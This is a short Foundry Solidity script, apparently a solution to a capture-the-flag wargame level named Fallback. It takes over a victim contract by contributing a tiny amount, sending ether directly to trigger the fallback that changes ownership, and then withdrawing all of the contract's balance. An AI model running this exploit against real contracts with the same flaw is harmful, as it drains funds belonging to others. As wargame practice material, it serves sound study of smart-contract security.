// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";

contract FallbackAttack is Script{
  function run() public{
    // Defining contract addresses
    address fallbackAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    uint256 attacker = vm.envUint("PRIVATE_KEY");

    // Instantiating contracts
    Fallback fallbackContract = Fallback(payable(fallbackAddress));

    vm.startBroadcast(attacker);

    // Attack
    // Contributing
    fallbackContract.contribute{value: 1}();
    
    // Sending eth
    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
    if(!success) revert();

    // Withdrawing all eth
    fallbackContract.withdraw();

    vm.stopBroadcast();
  }
}